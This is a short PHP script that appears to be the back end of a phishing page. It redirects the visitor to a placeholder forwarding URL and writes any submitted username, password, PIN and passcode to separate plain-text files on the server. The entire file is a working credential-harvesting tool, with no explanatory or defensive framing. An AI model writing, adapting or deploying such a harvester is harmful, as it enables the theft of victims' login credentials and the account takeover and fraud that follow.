<?php
header("Location: forwarding_url");

if (!empty($_POST['username'])) {
file_put_contents("usernames.txt", " "  . $_POST['username'] . "\n", FILE_APPEND);
}
if (!empty($_POST['passwd'])) {
file_put_contents("passwords.txt", " "   . $_POST['passwd'] . "\n", FILE_APPEND);
}
if (!empty($_POST['pin'])) {
file_put_contents("pin.txt", " "   . $_POST['pin'] . "\n", FILE_APPEND);
}
if (!empty($_POST['passcode'])) {
file_put_contents("passcode.txt", " "   . $_POST['passcode'] . "\n", FILE_APPEND);
 }

exit();

